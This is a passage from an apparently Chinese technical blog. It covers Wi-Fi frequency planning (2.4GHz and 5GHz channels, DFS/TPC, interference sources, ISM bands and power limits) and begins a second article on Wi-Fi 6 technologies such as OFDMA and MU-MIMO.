title=\"一、2.4GHz频段\"></a>一、2.4GHz频段</h2><p>使用2.4GHz频段的无线技术标准较多且发展较早，不仅是Wi-Fi，蓝牙和Zigbee等也普遍采用该频段，造成该频段早已拥堵不堪。相对于后来的5GHz频段，2.4G频段的波长更短，传输衰减更小，穿透力更强，但在增强了信号的同时也加剧了2.4GHz频段的干扰。</p>\n<p>ISM中的2.4GHz频段有2.4-2.5GHz，总计100MHz的可用频率。在中国大陆，Wi-Fi被允许使用2.40-2.4835GHz，共计83.5MHz的频率来放置各个信道。</p>\n<ul>\n<li>这些频率被划分为13个20MHz的信道，信道与信道的中心频点之间的频率差为5MHz，共使用2.412-2.472GHz这60MHz频率来放置中心频点</li>\n<li>为了防止信道之间干扰，每个20MHz宽的信道，实际占用22MHz的频率，且信道两端各使用了1MHz保护频率来防止干扰。</li>\n<li>为了不与其他非2.4GHz频段的无线电设备干扰，Wi-Fi还在其起始频率处增加了1MHz的保护频率，来避免与其他频段互相干扰。</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/2.4GHz.png\" class=\"\">\n\n<blockquote>\n<p>信道14的定义不规律，与13信道的间隔为12MHz，位于该ISM频段的上限，在美国和世界大部分地区都被禁止，但在日本却被允许<br>尽管在中国允许使用12-13信道（美国要求限制功率），但由于存在较严重的邻频干扰，许多路由器厂商建议不使用</p>\n</blockquote>\n<ul>\n<li>最初的802.11b，采用22MHz的信道带宽，最多只能容纳3组没有重叠的信道，即：1、6、11。</li>\n<li>后续802.11g&#x2F;n，采用20MHz的信道带宽，可以容纳4组没有重叠的信道，即：1、5、9、13。</li>\n<li>802.11n首次支持40MHz的信道带宽（不支持80MHz带宽），但只有2组没有重叠的信道，即：3、11。</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/24.png\" class=\"\">\n\n<h2 id=\"二、5GHz频段\"><a href=\"#二、5GHz频段\" class=\"headerlink\" title=\"二、5GHz频段\"></a>二、5GHz频段</h2><p>5GHz频段的开放较晚，可用频谱充足（4.910GHz-5.875GHz，有900多M的带宽，是2.4G的10倍还多）、干扰小、速率高，是目前Wi-Fi的首选，但也存在信号穿透力差、空气中衰减较大等问题。常见设备有Wi-Fi、气象雷达、无线图传等。</p>\n<p>5GHz Wi-Fi仍然延续了2.4GHz Wi-Fi信道的命名标准（但为减少干扰，不再允许信道之间频率重叠），从5.0GHz开始称为信道1，每个信道宽度为20Mhz，之后每隔5MHz中心频率，信道数增加1。例如，38信道就是指中心频率为5190Mhz，宽度为20MHz的信道。</p>\n<p>2002年，工信部发布了<a href=\"https://www.miit.gov.cn/jgsj/wgj/wjfb/art/2020/art_bfd0fd64e0a1427aaf8aff18a01c0fd0.html\">5.8GHz的频率管理规定</a>，开放了5.8GHz频段（也称为5GHz高频段），范围为5.745–5.825GHz，共计100MHz，划分为149-165信道。</p>\n<blockquote>\n<p>当时，该频段也被移动运营商用于无线局域网的CPE接入，但工信部要求须取得相应的基础电信业务经营许可，且收取频率占用费。</p>\n</blockquote>\n<p>2012年，中国工信部正式开放5.2GHz频段（也称为5GHz低频段），范围为5150-5350MHz，共计200MHz频率，划分为高低部分，各100Mhz。其中：</p>\n<ul>\n<li>5170-5250MHz，共80MHz，划分为36-48信道，可以直接使用，</li>\n<li>5250-5330MHz，共80MHz，划分为52-64信道，为DFS信道；</li>\n<li>信道前后各空余的20Mhz频率作为保护带使用</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/5GHz.jpg\" class=\"\">\n\n<p>根据IEEE 802.11系列标准，Wi-Fi可以采用20MHz、40MHz、80MHz和160MHz等4种方式，信道越宽，传输速率也越高。</p>\n<ul>\n<li>对于20MHz带宽，5GHz频段可以容纳13个信道，包括5.2GHz的8个信道(其中4个需支持DFS)，和5.8GHz的5个信道</li>\n<li>对于40MHz带宽，5GHz频段可以容纳6个信道，包括5.2GHz的4个信道（其中2个需支持DFS），和5.8GHz的2个信道</li>\n<li>对于80MHz带宽，5GHz频段可以容纳3个信道，包括5.2GHz的2个信道（其中1个需支持DFS），和5.8GHz的1个信道</li>\n<li>中国目前不允许160MHz带宽，因为5.8Ghz频段的带宽不足，而5.2GHz频段由于需要支持DFS无法使用</li>\n</ul>\n<h2 id=\"三、DFS-TPC\"><a href=\"#三、DFS-TPC\" class=\"headerlink\" title=\"三、DFS &amp; TPC\"></a>三、DFS &amp; TPC</h2><p>由于许多军用、气象用雷达也都使用5GHz的频段，当中有些频段与Wi-Fi有所重叠，例如欧洲军方的雷达系统广泛运用这一频率(其中探测隐型飞机的雷达就使用这一频率)，如果民用的无线产品也使用这一频率，很可能会对军事雷达和通讯产生干扰。为此，IEEE组织制定了<strong>802.11h</strong>规范并要求Wi-Fi厂商遵循，也就是：<code>Auto DFS + Auto TPC = 802.11h</code>。</p>\n<p>简单来说，DFS就是要求无线产品主动探测军方使用的频率，并主动选择其他频率以避免干扰。<br>DFS（Dynamic Frequency Selection）动态频率选择，是通过动态将5GHz无线电的工作频率切换到不干扰雷达的频率以避免干扰雷达信号的过程。<br>TPC（Transmit Power Control）发射功率控制，是指根据法规要求和范围信息来调整无线电的发射功率。</p>\n<p>802.11h的技术认证是属于强制性的，不符合标准的产品将不会获得欧盟及有此项规范要求的国家的无线产品上市许可。目前世界各国对Auto DFS &amp; Auto TPC的使用频率范围规定不一，但要求具备这两项机能的趋势，却是确定的。其核心要求是：</p>\n<ul>\n<li>DFS频道时不得在户外环境、只能在室内使用</li>\n<li>当Wi-Fi路由器准备启用DFS信道之前，必须先<strong>静默等待60秒</strong>，以确认没有军事与气象雷达正在使用</li>\n<li>具备实时侦测军事与气象雷达信号的能力，一旦发现必须自动回避并切换到监管允许的其他频道，以免干扰到军事雷达与气象雷达运作</li>\n</ul>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/dfs.jpeg\" class=\"\">\n\n<blockquote>\n<p>在中国，政府规定52-64信道需满足DFS要求，为避免DFS功能造成数据传输中断，路由器厂商通常不使用这些信道用于MESH回传中继</p>\n</blockquote>\n<h2 id=\"四、关于频率干扰的讨论\"><a href=\"#四、关于频率干扰的讨论\" class=\"headerlink\" title=\"四、关于频率干扰的讨论\"></a>四、关于频率干扰的讨论</h2><h3 id=\"其他通讯协议\"><a href=\"#其他通讯协议\" class=\"headerlink\" title=\"其他通讯协议\"></a>其他通讯协议</h3><p>由于ISM频段无需授权，除了Wi-Fi以外，许多通信协议也在同时使用这些频段。</p>\n<ul>\n<li>蓝牙同样采用2.4GHz频段（2.400-2.4835MHz），规划了40个物理信道，每个信道带宽2MHz，包含3个广播信道和37个数据信道<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/bluetooth.png\" class=\"蓝牙和Wi-Fi的信道对比\"></li>\n<li>大疆公司开发的全高清数字图像传输系统Lightbridge，同样工作在2.4GHz和5GHz频段，但自主开发了基于广播模式的数据协议，由于省略了握手的协议开销，延迟更短，速率更高，传输距离也高达1.7公里。</li>\n<li>基于IEEE 802.15.4标准的ZigBee协议、LoRa协议也使用2.4GHz频段</li>\n<li>高速公路ETC收费系统使用基于5.8GHz的有源电子标签</li>\n</ul>\n<h3 id=\"USB-3-0\"><a href=\"#USB-3-0\" class=\"headerlink\" title=\"USB 3.0\"></a>USB 3.0</h3><p>2012年，Intel发布了技术白皮书<a href=\"https://www.usb.org/sites/default/files/327216.pdf\">《USB 3.0 Radio Frequency Interference Impact on 2.4 GHz Wireless Devices》</a>，明确指出USB3.0在使用时，会在2.4G频段增加约20dB的噪声，造成对ISM频段的射频干扰。这种干扰会降低无线接收的灵敏度，进而缩减收讯范围，足以影响干扰无线设备（无线网卡、无线鼠标及无线耳机等）的正常使用。</p>\n<p>实际上，USB 3.0的信号速率是５Gbit&#x2F;s，但由于USB 3.0芯片需要支持数据加密，为此在时钟上应用了扩频技术，导致其频谱从0Hz一直延伸到5GHz。经Intel测量，干扰功率随频率下降，在2.4G频段约有-60dBm，到5G频段只有-90dBm。很可惜的是，这个由USB 3.0高频通讯所产生的噪讯是一种宽频噪讯，因此无法被过滤消除，而且刚好落在常用的2.4-2.5GHz的频段范围。</p>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/usb.jpeg\" class=\"\">\n\n<p>Intel建议的解决方式是对USB 3.0连接器及周边装置进行遮蔽设计，做得愈彻底，效果愈好。此外，无线天线放得离USB 3.0连接器及装置也要愈远愈好。</p>\n<blockquote>\n<p>路由器厂商通常建议用户关闭USB 3.0接口，改用USB 2.0模式。</p>\n</blockquote>\n<h3 id=\"微波炉\"><a href=\"#微波炉\" class=\"headerlink\" title=\"微波炉\"></a>微波炉</h3><p>此外，家用微波炉也可能对2.4GHz产生严重干扰，因为其辐射频段是2.450GHz，而且功率超大，但前提是微波炉的密封不好造成辐射泄露。有兴趣的，可以看看<a href=\"https://news.sciencenet.cn/htmlnews/2015/5/318644.shtm\">1998年澳大利亚Parkes射电天文望远镜的乌龙事件</a>。</p>\n<h2 id=\"五、其他频段\"><a href=\"#五、其他频段\" class=\"headerlink\" title=\"五、其他频段\"></a>五、其他频段</h2><p>在美国，Wi-Fi可以采用3.9GHz频段，具体为3.655-3.695GHz之间的40M带宽，但必须获得政府许可执照。<br>此外，美国Wi-Fi还采用了4.6GHz频段，具体为4.940-4.990GMHz的50M带宽，但仅限美国公共安全机构使用。</p>\n<p>当前，Wi-Fi的下阶段演进目标是<strong>WiFi 6E</strong>，多了一个E，代表着“Extended”，扩展的意思，主要改进点在于支持 6GHz频段，这就意味着WiFi 6E设备能够支持2.4GHz、5GHz和6GHz三个频段，并由此带来了很多优势。</p>\n<p>与已经普遍使用的2.4GHz、5GHz频段相比，6GHz频段在很多地区还未开放，所以使用6GHz频段的设备比较少，自然在这个频段上的拥堵、干扰就比较少。同时6GHz频段处于5925-7125MHz之间，包含7个160MHz信道、14个80MHz信道、29个40MHz信道、60个20MHz信道，总计110个信道。信道数量比5GHz频段和2.4GHz频段有了大幅的增长，带来更为强悍的吞吐能力，特别是160MHz信道从5GHz的1个提升到了7个，能实现7条互不干扰的连接了。</p>\n<hr>\n<h2 id=\"附录一：ISM（Industrial-Scientific-Medical）频段\"><a href=\"#附录一：ISM（Industrial-Scientific-Medical）频段\" class=\"headerlink\" title=\"附录一：ISM（Industrial Scientific Medical）频段\"></a>附录一：ISM（Industrial Scientific Medical）频段</h2><p>ISM频段（Industrial Scientific Medical Band）主要是开放给工业、科学和医用3个主要机构使用的公共频段资源。<br>无需事前获得政府机构的授权，任何人都可以使用ISM频段进行数据传输，但必须遵循管制要求限制发射功率，目的是控制辐射范围以避免干扰他人使用。当然，如果ISM频段内的无线电设备之间产生了干扰，原则上也不受政府保护，使用者应自行解决或协商解决。</p>\n<p>在美国，ISM频段是由美国联邦通信委员会（FCC）负责定义，其他大多数国家和地区的政府也都安排了ISM频段，但具体规定并不统一。</p>\n<p>在我国，根据《中华人民共和国无线电频率划分规定》及其中脚注5.138和5.150，规定：</p>\n<ul>\n<li>6765-6795kHz（中心频率6780kHz）、61-61.5GHz（中心频率61.25GHz）、122-123GHz（中心频率122.5GHz）、244-246GHz（中心频率245GHz）频段用于ISM应用，但其使用须经无线电主管部门给予特别批准；</li>\n<li>13553-13567kHz（中心频率13560kHz）、26957-27283kHz（中心频率27120kHz）、40.66-40.7MHz（中心频率40.68MHz）、2400-2500MHz（中心频率2450MHz）、5725-5875MHz（中心频率5800MHz）、24-24.25GHz（中心频率24.125GHz）频段也用于ISM应用，在这些频段内工作的无线电业务必须承受由于这些ISM应用产生的有害干扰</li>\n<li>国际上，433.05-434.79MHz（中心频率433.92MHz）频段是国际电联第一区部分欧洲国家指定用于ISM应用的频段，902-928MHz（中心频率915MHz）频段是美国等国际电联划分的第二区国家指定用于ISM应用的频段，上述指定用于ISM应用的频段也划分给了无线电业务使用，不论是ISM应用还是符合划分的无线电业务，都可以使用上述频段，但均要符合我国无线电管理有关规定</li>\n</ul>\n<p>Wi-Fi所使用的2.4G频段与5.8G频段就落在全球各国共有的ISM频段上，此外常见的ISM频段还有：</p>\n<h3 id=\"13-56MHz\"><a href=\"#13-56MHz\" class=\"headerlink\" title=\"13.56MHz\"></a>13.56MHz</h3><p>频率范围为13.553-13.567MHz，处于短波频段。<br>这是最典型的RFID &#x2F; NFC高频工作频率，是实际应用中使用量最大的电子标签，国际标准有ISO14443、ISO15693和ISO18000-3等。</p>\n<blockquote>\n<p>传统ID卡的工作片一般是125KHz或135kHz，属于低频卡，常见国际标准有ISO11784&#x2F;11785、ISO18000-2等。<br>但是，30KHz～300KHz的低频卡通常并不纳入ISM频段范围。</p>\n</blockquote>\n<h3 id=\"27-125MHz\"><a href=\"#27-125MHz\" class=\"headerlink\" title=\"27.125MHz\"></a>27.125MHz</h3><p>频率范围为26.957-27.283MHz。<br>除了电感耦合RFID系统外，这个频率范围的ISM应用还有医疗用电热治疗仪、工业用高频焊接装置和传呼机等，国内很多遥控玩具工作频率在27MHz.</p>\n<h3 id=\"315MHz\"><a href=\"#315MHz\" class=\"headerlink\" title=\"315MHz\"></a>315MHz</h3><p>北美地区很早就将315MHz纳入ISM频段，广泛地运用在车辆监控、遥控遥测、无线抄表、门禁系统、工业数据采集、安全防火系统、生物信号采集、水文气象监控、机器人控制等领域。<br>这也是国内早期无线遥控产品的主要频段，但由于这个频段的产品庞杂造成干扰严重，后期逐步转向使用433MHz频段。</p>\n<h3 id=\"433-920MHz\"><a href=\"#433-920MHz\" class=\"headerlink\" title=\"433.920MHz\"></a>433.920MHz</h3><p>频率范围为430.050～434.790MHz，属于UHF频段，电磁波遇到建筑物或其他障碍物时，将出现明显的衰减和反射。。<br>在世界范围内分配给业余无线电服务使用，该频段可用于反向散射RFID系统，除此之外，还可用于小型电话机、遥测发射器、无线耳机、近距离小功率无线对讲机、汽车无线中央闭锁装置等。</p>\n<h3 id=\"民用对讲机\"><a href=\"#民用对讲机\" class=\"headerlink\" title=\"民用对讲机\"></a>民用对讲机</h3><p>民用对讲机也采用ISM频段，但各国的规定并不统一，我国开放的频点数20个，频率范围409.750-409.9875MHZ，间隔125KHz。<br>美国则是14个频点，分462MHz和467MHz两组，每组7个频点，日本、韩国也采用美国标准。</p>\n<h2 id=\"附录二：关于发射功率的法律限制\"><a href=\"#附录二：关于发射功率的法律限制\" class=\"headerlink\" title=\"附录二：关于发射功率的法律限制\"></a>附录二：关于发射功率的法律限制</h2><p>无线路由器的功率很低，而且严格受到国家的管控，只要是符合国家标准的产品，都是安全的。<br>中国工信部对于<a href=\"https://wap.miit.gov.cn/cms_files/filemanager/1226211233/attach/20219/d125301b13454551b698ff5afa49ca28.pdf\">Wi-Fi各频段的发射功率有严格要求</a>，对路由器无线辐射的担心是不必要的。<br>无线功率的常用单位有：分贝毫瓦（dBm），毫瓦（mW）</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">EIRP（等效全向辐射功率） = 有效功率 + 天线增益 - 天线馈线线路损耗</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4GHz频段\"><a href=\"#2-4GHz频段\" class=\"headerlink\" title=\"2.4GHz频段\"></a>2.4GHz频段</h3><p>天线增益＜10dBi时：发射功率≤100mW 或 ≤20dBm，一般是家用路由器和室内AP。<br>天线增益≥10dBi时：发射功率≤500mW 或 ≤27dBm，一般是室外AP。</p>\n<h3 id=\"5-2Ghz频段（36-64信道）\"><a href=\"#5-2Ghz频段（36-64信道）\" class=\"headerlink\" title=\"5.2Ghz频段（36~64信道）\"></a>5.2Ghz频段（36~64信道）</h3><p>中国：发射功率≤200mW 或 23dBm</p>\n<h3 id=\"5-8Ghz频段（149-165信道）\"><a href=\"#5-8Ghz频段（149-165信道）\" class=\"headerlink\" title=\"5.8Ghz频段（149~165信道）\"></a>5.8Ghz频段（149~165信道）</h3><p>发射功率≤2000+mW或33dBm，射频口发射功率 &lt;&#x3D;500mW 或 27dBm（功放组合功率）</p>\n<blockquote>\n<p>美国、澳大利亚等国家对发射功率的要求较为宽松，一般为4000mW，或36dBm，因此许多路由器可以通过修改国家属性提高覆盖范围</p>\n</blockquote>\n<h2 id=\"附录三：中国移动通信的无线频率分布\"><a href=\"#附录三：中国移动通信的无线频率分布\" class=\"headerlink\" title=\"附录三：中国移动通信的无线频率分布\"></a>附录三：中国移动通信的无线频率分布</h2><img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/YD.png\" class=\"\">\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/DX.png\" class=\"\">\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/LT.png\" class=\"\">\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/GD.png\" class=\"\">\n\n<h2 id=\"附录四：车联网的常用频率\"><a href=\"#附录四：车联网的常用频率\" class=\"headerlink\" title=\"附录四：车联网的常用频率\"></a>附录四：车联网的常用频率</h2><img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/auto.png\" class=\"\">\n\n<h2 id=\"附录五：昙花一现的无线城市\"><a href=\"#附录五：昙花一现的无线城市\" class=\"headerlink\" title=\"附录五：昙花一现的无线城市\"></a>附录五：昙花一现的无线城市</h2><p>2008开始中国进入3G移动通信时代，受到通信技术标准的困扰，中国移动大力推广“无线城市”，试图采用基于802.11n的Wi-Fi技术分流移动网络流量，通过大功率CPE实现大范围的室外覆盖，曾经宣布已在全国部署300万个Wi-Fi热点并提供商用，但始终举步维艰，重要原因是：</p>\n<ul>\n<li>频率资源限制：根据通信蜂窝网的基本原则，有效覆盖至少需要3个互不干扰的40MHz信道，也就是120MHz频率。但2.4G频段只有83.5MHz，先期开发的5.8GHz只有100MHz，5.2GHz有干净的80MHz，但另外80MHz需要满足DFS的要求，始终无法提供足够的频率资源。</li>\n<li>商业模式缺失：由于IEEE 802.11是IT技术而非通信技术，其WAP2认证协议的功能非常简单，当时提出要攻克Wi-Fi认证难题，实际是希望实现基于时长或流量的收费模式，但最终无疾而终</li>\n</ul>\n<p>随着2013年4G牌照的发放，运营商放弃无线城市转而全力发展移动网络，而工信部也全面放开5GHz频段，用户也不再为那些室外CPE的频率干扰闹心了。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li><a href=\"https://wap.miit.gov.cn/zwgk/zcwj/wjfb/tz/art/2021/art_e4ae71252eab42928daf0ea620976e4e.html\">工信部-关于加强和规范2400MHz、5100MHz和5800MHz频段无线电管理有关事宜的通知</a></li>\n<li><a href=\"https://www.wi-fi.org/zh-hans\">Wi-Fi Alliance的官方网站</a></li>\n</ul>\n<h3 id=\"技术评论\"><a href=\"#技术评论\" class=\"headerlink\" title=\"技术评论\"></a>技术评论</h3><ul>\n<li><a href=\"https://yuanze.wang/posts/things-about-wifi/\">Wi-Fi的那些事：无线电、速率与组网</a></li>\n<li><a href=\"https://www.eet-china.com/mp/a77283.html\">无线路由器及Wi-Fi组网指南（史上最全）</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E9%81%93%E5%88%97%E8%A1%A8\">无线局域网信道列表 - Wiki</a></li>\n<li><a href=\"https://www.sohu.com/a/432446555_814535\">何为ISM频段？ISM频段主要频率有哪些？</a></li>\n<li><a href=\"http://www.iwl.iiot.com/news/345.html\">射频识别RFID不同工作频段有何特点</a></li>\n<li><a href=\"http://uuspider.com/2015/01/14/01.html\">雷达的工作频率</a></li>\n</ul>\n<h3 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h3><ul>\n<li><a href=\"WLAN%E9%A2%91%E6%AE%B5%E4%BB%8B%E7%BB%8D.pdf\">WLAN频段介绍.pdf</a></li>\n<li><a href=\"Intel%E5%85%B3%E4%BA%8EUSB3.0%E6%97%A0%E7%BA%BF%E5%B9%B2%E6%89%B0%E7%9A%84%E7%99%BD%E7%9A%AE%E4%B9%A6.pdf\">Intel关于USB 3.0频率干扰的技术白皮书</a></li>\n<li><a href=\"%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%92%8C%E7%89%A9%E8%81%94%E7%BD%91%E6%97%A0%E7%BA%BF%E7%94%B5%E9%A2%91%E7%8E%87%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-2021.pdf\">工业互联网和物联网无线电频率使用指南（2021年版）</a></li>\n<li><a href=\"00016c58d7ef1d09ab3538.pdf\">车联网发展、法律法规和测试研究</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之三：关键技术","url":"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/","content":"<p>从理论上看，Wi-Fi的理论速率与以下因素密切相关：频宽、频率复用技术、调制方法、编码方案和天线数量等，可以表示为下面的公式：</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/rate.png\" class=\"\">\n\n<p>回顾整个 802.11 协议标准的发展历程，每一代新的协议都在与3GPP的移动通信技术相互借鉴，传输速率和数据吞吐率方面有着较大的提升，尤其是演进到 802.11ac 协议后，无线网络带宽与有线差距越来越小，基本可以满足大部分应用的需求。但802.11ac 的最大速率6.9Gbps只是实验室环境的理论值，在实际应用场景的有效带宽远远低于理论值，且并发用户数越多，有效吞吐率就会越差。</p>\n<p>802.11ax 的关键字是高效率无线标准（HEW，High-Efficiency Wireless），任务目标是：</p>\n<ul>\n<li>进一步提高理论最大速率，从 802.11ac 的6.9Gbps提高到 9.6Gbps；</li>\n<li>更重要的是，大幅度提高多用户并发效率，提供密集用户环境下4倍实际吞吐量的提升</li>\n<li>以及，更好适应物联网等室外场景的应用。</li>\n</ul>\n<p>从技术栈的角度看，Wi-Fi 6主要采用了以下优化技术，分别工作在PHY物理层和MAC链路层。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/arch.png\" class=\"\">\n\n<h2 id=\"一、OFDMA-多用户的-OFDM\"><a href=\"#一、OFDMA-多用户的-OFDM\" class=\"headerlink\" title=\"一、OFDMA &#x3D; 多用户的 OFDM\"></a>一、OFDMA &#x3D; 多用户的 OFDM</h2><p>从 802.11a 开始直到 802.11ac，数据传输一直采用OFDM（正交频分复用）模式，单一信道被分成了多个子载波，每一个子载波是正交的，通过快速傅里叶变换（FFT）和快速傅里叶逆变换（IFFT）来构成的，不会互相干扰。<br>但是，在OFDM模式下，不同用户是通过不同时间片段区分出来的，因此对于每一个时间片段，一个用户完整占据所有的子载波并发送一个完整的数据包，因此如果某个用户发送的数据不多，频率资源用不满的情况下，其他用户只能干巴巴地排队等着，频谱资源的使用效率不高。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ofdm.png\" class=\"\">\n\n<p>为了解决这个问题，802.11ax 引入了OFDMA（正交频分复用多址）技术，后面多了个字母A代表多址，就是多用户复用的意思，也就是OFDM的多用户版本。</p>\n<blockquote>\n<p>实际上，OFDMA技术来自于3GPP LTE，802.11ax就是简单抄袭过来的</p>\n</blockquote>\n<p>具体实现方式是利用 OFDM 对信道进行父载波化，将同一个带宽下的所有子载波划分成若干个子载波组，每一个组被称作一个 RU（Resouce Unit，资源单元），可以同时分配给不同的用户使用，每一个时间片上可有多个用户同时发送，这样就提高了用户数据速率并减少了延迟，特别适用于大量具有短帧或低速率要求的设备，如物联网设备。<br>在 OFDMA 中，一个 OFDM 信号是由多个子载波组成，这些子载波就组成了一个用户自己的带宽，每个用户可分配的 RU 大小可以是不同的。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ofdma.png\" class=\"\">\n\n<p>与传统OFDM相比，OFDMA并不能显著提升单用户速率，但对于多用户并发将带来明显的优势：</p>\n<ul>\n<li>更稳定的传输效率：在部分节点信道状态不太好的情况下，可以根据信道质量分配发送功率，来更精细化的分配信道时频资源</li>\n<li>更短的传输延迟：因为 802.11ac 及之前的标准都是占据整个信道传输数据的，如果有一个 QOS 数据包需要发送，其一定要等之前的发送者释放完整个信道才行，所以会存在较长的时延。在OFDMA 模式下，由于一个发送者只占据整个信道的部分资源，一次可以发送多个用户的数据，所以能够减少 QOS 节点接入的时延</li>\n<li>更高的用户并发度：OFDMA将整个信道资源划分成多个子载波，子载波又按不同 RU 类型被分成若干组，每个用户可以占用一组或多组 RU 以满足不同带宽需求的业务</li>\n</ul>\n<h2 id=\"二、DL-MU-MIMO-UL-MU-MIMO\"><a href=\"#二、DL-MU-MIMO-UL-MU-MIMO\" class=\"headerlink\" title=\"二、DL MU-MIMO + UL MU-MIMO\"></a>二、DL MU-MIMO + UL MU-MIMO</h2><p>路由器上面的天线数量是越来越多，现在不管啥价钱的路由器，都长得跟螃蟹似的，张牙舞爪好不唬人。为啥要用这么多天线？就是为了更好地实现MIMO（多输入多输出）技术。简单来说，就是在信号发射时，用多根天线来同时发送多路不同的数据，速度自然成倍提升；在接收时，多个天线同时接收手机发来的信号，跟戴了助听器一样，接收灵敏度也得到了增强。</p>\n<p>在传统的SU-MIMO中，若具有多条空间流的路由器下同时连接了多个只支持单个空间流的设备，在它们同时下载时，路由器只能使用一条空间流轮流与这些设备通信，剩下的空间流均会被浪费。</p>\n<h3 id=\"下行-MU-MIMO\"><a href=\"#下行-MU-MIMO\" class=\"headerlink\" title=\"下行 MU-MIMO\"></a>下行 MU-MIMO</h3><p>2016年推出的802.11ac wave2中，增加了MU-MIMO（Multi-User MIMO）的支持（仅下行方向），AP可以使用不同的空间流（天线）与不同的设备进行通信，从而带来多路复用增益，实现了对多用户下行并发场景性能的提升。</p>\n<blockquote>\n<p>MU-MIMO技术在制定之时，最多只允许3条流同时传输，如今更多手机均使用2x2MIMO，但两台这样的手机是无法激活MU-MIMO的。<br>而且，MU-MIMO仅会在多台均支持MU-MIMO的设备同时吞吐时才会生效，若无线网络中支持MU-MIMO的终端设备较少，其效果将会非常有限。</p>\n</blockquote>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/DL-MIMO.png\" class=\"\">\n\n<p>802.11ac 只支持DL 4x4 MU-MIMO（下行），在802.11ax中进一步增加了MU-MIMO数量，可支持DL 8x8 MU-MIMO，同时借助DL OFDMA技术（下行），可同时进行MU-MIMO传输和分配不同RU进行多用户多址传输，既增加了系统并发接入量，又均衡了吞吐量。<br>在信道评估阶段，802.11ax 使用 OFDMA 机制中的 trigger 方式来完成 AP 收集各 STA 的信道 CBF（Compressed Beamforming Feedback，压缩波束成形反馈信息）信息，进行信道质量评估。</p>\n<h3 id=\"上行-MU-MIMO\"><a 